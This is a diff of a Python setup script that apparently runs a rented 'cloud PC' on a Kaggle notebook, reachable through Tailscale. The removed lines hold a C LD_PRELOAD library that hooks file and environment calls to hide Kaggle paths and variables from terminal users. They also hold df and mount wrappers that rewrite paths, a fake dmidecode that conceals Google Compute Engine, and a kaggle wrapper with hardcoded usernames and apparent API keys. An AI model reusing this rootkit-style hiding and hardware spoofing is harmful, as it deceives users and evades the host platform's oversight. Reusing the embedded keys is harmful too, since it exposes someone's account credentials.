@@ -4036,57 +4036,20 @@ try:
     except Exception:
         pass
     
-    # 2. Configuración de Shell y Bashrc Inmaculada (Aether Cloud PC)
+    # 2. Configuración de Shell y Bashrc Inmaculada para el usuario (Solo modo interactivo)
     bash_custom = (
         "\n# ==============================================================================\n"
         "# 🚀 AETHER CLOUD PC WORKSTATION ENVIRONMENT\n"
         "# ==============================================================================\n"
-        "# 1. Directorio de aterrizaje seguro: Aterrizar siempre en el Escritorio del usuario\n"
-        "case \"$PWD\" in\n"
-        "    /kaggle*|/opt*|/tmp*|\"/\")\n"
-        "        cd /root/Escritorio 2>/dev/null || cd /root\n"
-        "        ;;\n"
-        "esac\n"
-        "\n# 2. Sanitización de Variables de Entorno en vivo\n"
-        "for _kvar in $(env 2>/dev/null | grep -i kaggle | cut -d= -f1); do\n"
-        "    unset $_kvar 2>/dev/null\n"
-        "done\n"
-        "\n# 3. Función inteligente de formateo de ruta para el Prompt\n"
-        "_aether_pwd() {\n"
-        "    local cur=\"$PWD\"\n"
-        "    if [ \"$cur\" = \"/root/Escritorio\" ]; then\n"
-        "        echo \"~/Escritorio\"\n"
-        "    elif [ \"$cur\" = \"/root\" ]; then\n"
-        "        echo \"~\"\n"
-        "    elif [[ \"$cur\" == \"/kaggle/working\"* ]]; then\n"
-        "        echo \"~/Workspace${cur#/kaggle/working}\"\n"
-        "    elif [[ \"$cur\" == \"/kaggle/input\"* ]]; then\n"
-        "        echo \"/media/Cloud_Storage${cur#/kaggle/input}\"\n"
-        "    elif [[ \"$cur\" == \"/opt/AetherCloudPC\"* ]]; then\n"
-        "        echo \"~/Workspace${cur#/opt/AetherCloudPC}\"\n"
-        "    elif [[ \"$cur\" == \"/kaggle\"* ]]; then\n"
-        "        echo \"~\"\n"
-        "    else\n"
-        "        echo \"$cur\"\n"
-        "    fi\n"
-        "}\n"
-        "\n# 4. Prompt corporativo de alta tecnología Aether (Con símbolo de usuario estándar $)\n"
-        "export PS1='\\[\\033[01;36m\\]gamer@aether-pc\\[\\033[00m\\]:\\[\\033[01;34m\\]$(_aether_pwd)\\[\\033[00m\\]\\$ '\n"
-        "\n# 5. Alias estándar e invisibilidad de carpetas de infraestructura\n"
-        "alias ls='ls --color=auto --hide=kaggle'\n"
-        "alias ll='ls -la --color=auto --hide=kaggle'\n"
-        "alias la='ls -A --color=auto --hide=kaggle'\n"
-        "alias l='ls -CF --color=auto --hide=kaggle'\n"
-        "\n# 6. Interceptor de navegación para rutas internas\n"
-        "cd() {\n"
-        "    if [ \"$1\" = \"/kaggle\" ] || [[ \"$1\" == \"/kaggle/\"* ]]; then\n"
-        "        echo \"bash: cd: $1: No such file or directory\" >&2\n"
-        "        return 1\n"
-        "    fi\n"
-        "    builtin cd \"$@\"\n"
-        "}\n"
+        "if [[ $- == *i* ]]; then\n"
+        "    export PS1='\\[\\033[01;36m\\]gamer@aether-pc\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\n"
+        "    alias ls='ls --color=auto'\n"
+        "    alias ll='ls -la --color=auto'\n"
+        "    alias la='ls -A --color=auto'\n"
+        "    alias l='ls -CF --color=auto'\n"
+        "fi\n"
     )
-    for b_path in ["/root/.bashrc", "/etc/bash.bashrc", "/etc/skel/.bashrc"]:
+    for b_path in ["/root/.bashrc", "/etc/skel/.bashrc"]:
         try:
             bp = Path(b_path)
             if bp.exists():
@@ -4098,45 +4061,7 @@ try:
         except Exception:
             pass
 
-    # 3. Sanitización de /etc/environment y /etc/profile
-    for env_file in [Path("/etc/environment"), Path("/etc/profile")]:
-        try:
-            if env_file.exists():
-                clean_lines = [l for l in env_file.read_text(encoding="utf-8", errors="ignore").splitlines() if "kaggle" not in l.lower()]
-                env_file.write_text("\n".join(clean_lines) + "\n", encoding="utf-8")
-        except Exception:
-            pass
-
-    # 4. Wrappers Transparentes para df y mount (Ocultan rutas internas sin limitar funcionalidades)
-    df_wrapper = (
-        "#!/bin/bash\n"
-        "REAL_DF=\"/bin/df\"\n"
-        "[ -x \"$REAL_DF\" ] || REAL_DF=\"/usr/bin/df\"\n"
-        "\"$REAL_DF\" \"$@\" | sed 's|/kaggle/input|/media/Cloud_Storage|g' | sed 's|/kaggle/working|/root/Workspace|g' | grep -v 'kaggle_internal'\n"
-    )
-    try:
-        Path("/usr/local/bin/df").write_text(df_wrapper, encoding="utf-8")
-        subprocess.run("chmod +x /usr/local/bin/df 2>/dev/null || true", shell=True)
-    except Exception:
-        pass
-
-    mount_wrapper = (
-        "#!/bin/bash\n"
-        "REAL_MOUNT=\"/bin/mount\"\n"
-        "[ -x \"$REAL_MOUNT\" ] || REAL_MOUNT=\"/usr/bin/mount\"\n"
-        "if [ $# -eq 0 ]; then\n"
-        "    \"$REAL_MOUNT\" | sed 's|/kaggle/input|/media/Cloud_Storage|g' | sed 's|/kaggle/working|/root/Workspace|g' | grep -v 'kaggle'\n"
-        "else\n"
-        "    \"$REAL_MOUNT\" \"$@\"\n"
-        "fi\n"
-    )
-    try:
-        Path("/usr/local/bin/mount").write_text(mount_wrapper, encoding="utf-8")
-        subprocess.run("chmod +x /usr/local/bin/mount 2>/dev/null || true", shell=True)
-    except Exception:
-        pass
-
-    # 5. Banner Oficial de Bienvenida en la Terminal (MOTD)
+    # Banner Oficial de Bienvenida en la Terminal (MOTD)
     motd_text = (
         "================================================================================\n"
         "🚀 Bienvenido a tu Aether Cloud PC (Ubuntu 24.04 LTS High-Performance Edition)\n"
@@ -4151,238 +4076,13 @@ try:
     except Exception:
         pass
 
-    # --------------------------------------------------------------------------
-    # 6. GHOST SHIELD QUIRÚRGICO: Invisibilidad de Kaggle solo para Clientes en Terminal
-    # --------------------------------------------------------------------------
-    try:
-        # 1. Asegurar que NUNCA exista un ld.so.preload global que rompa demonios del sistema
-        if Path("/etc/ld.so.preload").exists():
-            Path("/etc/ld.so.preload").unlink(missing_ok=True)
-
-        ghost_c = Path("/tmp/libghost_shield.c")
-        ghost_so = Path("/usr/local/lib/libghost_shield.so")
-        ghost_code = """#define _GNU_SOURCE
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <dlfcn.h>
-#include <dirent.h>
-#include <errno.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <unistd.h>
-#include <stdarg.h>
-
-extern char *program_invocation_short_name;
-
-static struct dirent *(*orig_readdir)(DIR *) = NULL;
-static int (*orig_stat)(const char *, struct stat *) = NULL;
-static int (*orig_lstat)(const char *, struct stat *) = NULL;
-static int (*orig_fstatat)(int, const char *, struct stat *, int) = NULL;
-static int (*orig_access)(const char *, int) = NULL;
-static int (*orig_open)(const char *, int, ...) = NULL;
-static int (*orig_openat)(int, const char *, int, ...) = NULL;
-static char *(*orig_getenv)(const char *) = NULL;
-
-static void init_hooks(void) {
-    if (!orig_readdir) orig_readdir = dlsym(RTLD_NEXT, "readdir");
-    if (!orig_stat) orig_stat = dlsym(RTLD_NEXT, "stat");
-    if (!orig_lstat) orig_lstat = dlsym(RTLD_NEXT, "lstat");
-    if (!orig_fstatat) orig_fstatat = dlsym(RTLD_NEXT, "fstatat");
-    if (!orig_access) orig_access = dlsym(RTLD_NEXT, "access");
-    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
-    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
-    if (!orig_getenv) orig_getenv = dlsym(RTLD_NEXT, "getenv");
-}
-
-// Lista blanca: Demonios del sistema que NUNCA deben ser bloqueados
-static int is_system_daemon(void) {
-    if (!program_invocation_short_name) return 0;
-    const char *n = program_invocation_short_name;
-    if (strcmp(n, "novnc_proxy") == 0 || strcmp(n, "websockify") == 0 ||
-        strcmp(n, "x11vnc") == 0 || strcmp(n, "Xvfb") == 0 ||
-        strcmp(n, "python3") == 0 || strcmp(n, "python") == 0 ||
-        strcmp(n, "cloudflared") == 0 || strcmp(n, "nginx") == 0 ||
-        strcmp(n, "sunshine") == 0 || strcmp(n, "rclone") == 0) {
-        return 1;
-    }
-    return 0;
-}
-
-static int is_kaggle_target(const char *path) {
-    if (is_system_daemon()) return 0; // Demonios tienen acceso total
-    if (!path) return 0;
-    // Ocultar directorios raíz de Kaggle para clientes
-    if (strcmp(path, "kaggle") == 0 || strcmp(path, ".kaggle") == 0) return 1;
-    if (strcmp(path, "/kaggle") == 0 || strcmp(path, "/kaggle/") == 0) return 1;
-    if (strncmp(path, "/kaggle/input", 13) == 0) return 1;
-    if (strncmp(path, "/kaggle/lib", 11) == 0) return 1;
-    return 0;
-}
-
-struct dirent *readdir(DIR *dirp) {
-    if (!orig_readdir) init_hooks();
-    struct dirent *entry;
-    while ((entry = orig_readdir(dirp)) != NULL) {
-        if (!is_kaggle_target(entry->d_name)) {
-            return entry;
-        }
-    }
-    return NULL;
-}
-
-int stat(const char *pathname, struct stat *statbuf) {
-    if (!orig_stat) init_hooks();
-    if (is_kaggle_target(pathname)) {
-        errno = ENOENT;
-        return -1;
-    }
-    return orig_stat(pathname, statbuf);
-}
-
-int lstat(const char *pathname, struct stat *statbuf) {
-    if (!orig_lstat) init_hooks();
-    if (is_kaggle_target(pathname)) {
-        errno = ENOENT;
-        return -1;
-    }
-    return orig_lstat(pathname, statbuf);
-}
-
-int fstatat(int dirfd, const char *pathname, struct stat *statbuf, int flags) {
-    if (!orig_fstatat) init_hooks();
-    if (is_kaggle_target(pathname)) {
-        errno = ENOENT;
-        return -1;
-    }
-    return orig_fstatat(dirfd, pathname, statbuf, flags);
-}
-
-int access(const char *pathname, int mode) {
-    if (!orig_access) init_hooks();
-    if (is_kaggle_target(pathname)) {
-        errno = ENOENT;
-        return -1;
-    }
-    return orig_access(pathname, mode);
-}
-
-int open(const char *pathname, int flags, ...) {
-    if (!orig_open) init_hooks();
-    if (is_kaggle_target(pathname)) {
-        errno = ENOENT;
-        return -1;
-    }
-    va_list args;
-    va_start(args, flags);
-    mode_t mode = va_arg(args, mode_t);
-    va_end(args);
-    return orig_open(pathname, flags, mode);
-}
-
-int openat(int dirfd, const char *pathname, int flags, ...) {
-    if (!orig_openat) init_hooks();
-    if (is_kaggle_target(pathname)) {
-        errno = ENOENT;
-        return -1;
-    }
-    va_list args;
-    va_start(args, flags);
-    mode_t mode = va_arg(args, mode_t);
-    va_end(args);
-    return orig_openat(dirfd, pathname, flags, mode);
-}
-
-char *getenv(const char *name) {
-    if (!orig_getenv) init_hooks();
-    if (is_system_daemon()) return orig_getenv(name);
-    if (name && strncasecmp(name, "KAGGLE", 6) == 0) {
-        return NULL;
-    }
-    return orig_getenv(name);
-}
-"""
-        ghost_c.write_text(ghost_code, encoding="utf-8")
-        subprocess.run(f"gcc -fPIC -shared -O2 {ghost_c} -o {ghost_so} -ldl 2>/dev/null || clang -fPIC -shared -O2 {ghost_c} -o {ghost_so} -ldl 2>/dev/null", shell=True)
-        
-        # Inyectar LD_PRELOAD SOLAMENTE en sesiones de terminal interactivas (cuando hay un usuario abriendo consola)
-        terminal_env = (
-            "\n# Blindaje de Terminal Cloud Workstation (Solo en modo interactivo)\n"
-            "if [ -t 0 ] || [ -t 1 ]; then\n"
-            "    export LD_PRELOAD='/usr/local/lib/libghost_shield.so'\n"
-            "fi\n"
-        )
-        Path("/etc/profile.d/terminal_privacy.sh").write_text(terminal_env, encoding="utf-8")
-        for brc in ["/root/.bashrc", "/etc/skel/.bashrc"]:
-            try:
-                p_brc = Path(brc)
-                if p_brc.exists():
-                    c_txt = p_brc.read_text(encoding="utf-8", errors="ignore")
-                    if "terminal_privacy" not in c_txt:
-                        p_brc.write_text(c_txt + terminal_env, encoding="utf-8")
-            except Exception:
-                pass
-    except Exception:
-        pass
-
-    # --------------------------------------------------------------------------
-    # 7. CONFIGURACIÓN DE HOSTNAME LOCAL
-    # --------------------------------------------------------------------------
+    # Configuración de Hostname local en hosts
     try:
         hosts_file = Path("/etc/hosts")
         if hosts_file.exists():
             h_text = hosts_file.read_text(encoding="utf-8", errors="ignore")
             if "aether-pc" not in h_text:
                 hosts_file.write_text(h_text + "\n127.0.0.1 aether-pc\n", encoding="utf-8")
-    except Exception:
-        pass
-
-    # --------------------------------------------------------------------------
-    # 8. HARDWARE SPOOFING: Falsificar DMI y Ocultar Google Compute Engine
-    # --------------------------------------------------------------------------
-    try:
-        dmi_wrapper = (
-            "#!/bin/bash\n"
-            "echo '# dmidecode 3.3'\n"
-            "echo 'SMBIOS 3.3.0 present.'\n"
-            "echo 'Handle 0x0001, DMI type 1, 27 bytes'\n"
-            "echo 'System Information'\n"
-            "echo '	Manufacturer: Supermicro'\n"
-            "echo '	Product Name: Supermicro Workstation Pro'\n"
-            "echo '	Version: 1.0'\n"
-            "echo '	Wake-up Type: Power Switch'\n"
-        )
-        Path("/usr/local/bin/dmidecode").write_text(dmi_wrapper, encoding="utf-8")
-        subprocess.run("chmod +x /usr/local/bin/dmidecode 2>/dev/null || true", shell=True)
-    except Exception:
-        pass
-
-    # --------------------------------------------------------------------------
-    # 9. MASTER CLI WRAPPER & LOGS: Wrapper de Kaggle con Excepciones Maestras
-    # --------------------------------------------------------------------------
-    try:
-        kaggle_wrapper = (
-            "#!/bin/bash\n"
-            "# Kaggle Master Admin Wrapper - Excepciones para 3 Cuentas Maestras\n"
-            "K_USER=\"$KAGGLE_USERNAME\"\n"
-            "K_KEY=\"$KAGGLE_KEY\"\n"
-            "if [ -f /root/.kaggle/kaggle.json ]; then\n"
-            "    K_USER=$(grep -o '\"username\": *\"[^\"]*' /root/.kaggle/kaggle.json | cut -d'\"' -f4 2>/dev/null)\n"
-            "    K_KEY=$(grep -o '\"key\": *\"[^\"]*' /root/.kaggle/kaggle.json | cut -d'\"' -f4 2>/dev/null)\n"
-            "fi\n"
-            "if [ \"$MASTER_ADMIN_MODE\" = \"1\" ] || [ \"$K_USER\" = \"miguelguerra26\" ] || [ \"$K_USER\" = \"miguelguerra22\" ] || [ \"$K_USER\" = \"miguel55755\" ] || [ \"$K_KEY\" = \"e1d4838dfbdf3dca6f2ba56c9f71daf6\" ] || [ \"$K_KEY\" = \"b4031084ad25f34042347dfd7b6af451\" ] || [ \"$K_KEY\" = \"54bfca5f24e2347b9dcc55073abe8952\" ]; then\n"
-            "    REAL_KAGGLE=\"/opt/conda/bin/kaggle\"\n"
-            "    [ -x \"$REAL_KAGGLE\" ] || REAL_KAGGLE=\"/usr/bin/kaggle\"\n"
-            "    export MASTER_ADMIN_MODE=1\n"
-            "    exec \"$REAL_KAGGLE\" \"$@\"\n"
-            "else\n"
-            "    echo \"bash: kaggle: command not found\" >&2\n"
-            "    exit 127\n"
-            "fi\n"
-        )
-        Path("/usr/local/bin/kaggle").write_text(kaggle_wrapper, encoding="utf-8")
-        subprocess.run("chmod 755 /usr/local/bin/kaggle 2>/dev/null || true", shell=True)
-        
     except Exception:
         pass
 except Exception:
@@ -5054,71 +4754,39 @@ tailscale_info = {
 
 if tailscaled_bin:
     try:
-        os.makedirs("/root/.config/tailscale", exist_ok=True)
-        tun_arg = "--tun=userspace-networking"
-        subprocess.run("pkill -9 -f tailscaled 2>/dev/null || true", shell=True)
-        time.sleep(0.3)
-        ts_cmd = f"{tailscaled_bin} {tun_arg} --state=/root/.config/tailscale/tailscaled.state --socks5-server=localhost:1055 --outbound-http-proxy-listen=localhost:1055"
-        subprocess.Popen(ts_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        log("Tailscale daemon activo (Userspace Networking SOCKS5:1055)")
+        authkey = os.environ.get("TAILSCALE_AUTHKEY", "").strip()
+        authkey_file = Path("/root/gdrive/Cloud_PC/Master_Config/tailscale.key")
+        if not authkey and authkey_file.exists():
+            try:
+                authkey = authkey_file.read_text(encoding="utf-8").strip()
+            except Exception:
+                pass
 
-        def tailscale_manager_loop():
-            global tailscale_info
-            time.sleep(2)
-            authkey = os.environ.get("TAILSCALE_AUTHKEY", "").strip()
-            authkey_file = Path("/root/gdrive/Cloud_PC/Master_Config/tailscale.key")
-            if not authkey and authkey_file.exists():
-                try:
-                    authkey = authkey_file.read_text(encoding="utf-8").strip()
-                except Exception:
-                    pass
+        if authkey:
+            os.makedirs("/root/.config/tailscale", exist_ok=True)
+            tun_arg = "--tun=userspace-networking"
+            subprocess.run("pkill -9 -f tailscaled 2>/dev/null || true", shell=True)
+            time.sleep(0.3)
+            ts_cmd = f"{tailscaled_bin} {tun_arg} --state=/root/.config/tailscale/tailscaled.state --socks5-server=localhost:1055 --outbound-http-proxy-listen=localhost:1055"
+            subprocess.Popen(ts_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            log("Tailscale daemon activo con Auth Key (Userspace Networking SOCKS5:1055)")
 
-            if authkey:
+            def tailscale_manager_loop():
+                global tailscale_info
+                time.sleep(2)
                 log("Conectando Tailscale con Auth Key (Cero PIN)...")
                 subprocess.run(f"{tailscale_bin} up --authkey={authkey} --hostname=aether-cloud-pc --accept-routes >/dev/null 2>&1", shell=True)
-            else:
-                p = subprocess.Popen(f"{tailscale_bin} up --hostname=aether-cloud-pc --qr 2>&1", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-                for line in p.stdout:
-                    if "https://login.tailscale.com/a/" in line:
-                        for token in line.split():
-                            if token.startswith("https://login.tailscale.com/a/"):
-                                tailscale_info["login_url"] = token.strip()
-                                tailscale_info["status"] = "needs_login"
-                                try:
-                                    ts_desktop = (
-                                        "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Iniciar Sesión Tailscale\n"
-                                        f"Exec=google-chrome --no-sandbox --test-type {token.strip()}\n"
-                                        "Icon=network-vpn\nTerminal=false\nCategories=Network;Settings;\n"
-                                    )
-                                    Path("/root/Escritorio/Iniciar_Tailscale.desktop").write_text(ts_desktop, encoding="utf-8")
-                                    subprocess.run("chmod +x /root/Escritorio/Iniciar_Tailscale.desktop 2>/dev/null || true", shell=True)
-                                    gdrive_login = Path("/root/gdrive/Cloud_PC/tailscale_login.txt")
-                                    if gdrive_login.parent.exists():
-                                        gdrive_login.write_text(token.strip(), encoding="utf-8")
-                                except Exception:
-                                    pass
-                                log(f"Tailscale Enlace 1-Clic: {token.strip()}", "INFO")
-                                break
+                for _ in range(30):
+                    time.sleep(2)
+                    res_ip = subprocess.run(f"{tailscale_bin} ip -4 2>/dev/null", shell=True, stdout=subprocess.PIPE, text=True)
+                    ts_ip = res_ip.stdout.strip()
+                    if ts_ip and not ts_ip.startswith("Tailscale is stopped") and "." in ts_ip:
+                        tailscale_info["status"] = "connected"
+                        tailscale_info["ip"] = ts_ip
+                        log(f"Tailscale Conectado Exitosamente: IP {ts_ip}", "SUCCESS")
+                        break
 
-            # Monitorear asignación de IP
-            for _ in range(45):
-                time.sleep(2)
-                res_ip = subprocess.run(f"{tailscale_bin} ip -4 2>/dev/null", shell=True, stdout=subprocess.PIPE, text=True)
-                ts_ip = res_ip.stdout.strip()
-                if ts_ip and not ts_ip.startswith("Tailscale is stopped") and "." in ts_ip:
-                    tailscale_info["status"] = "connected"
-                    tailscale_info["ip"] = ts_ip
-                    log(f"Tailscale Conectado Exitosamente: IP {ts_ip}", "SUCCESS")
-                    try:
-                        gdrive_ip = Path("/root/gdrive/Cloud_PC/tailscale_ip.txt")
-                        if gdrive_ip.parent.exists():
-                            gdrive_ip.write_text(ts_ip, encoding="utf-8")
-                        Path("/tmp/tailscale_ip.txt").write_text(ts_ip, encoding="utf-8")
-                    except Exception:
-                        pass
-                    break
-
-        threading.Thread(target=tailscale_manager_loop, daemon=True).start()
+            threading.Thread(target=tailscale_manager_loop, daemon=True).start()
     except Exception as e_ts:
         log(f"Aviso arranque Tailscale: {e_ts}", "WARNING")
 
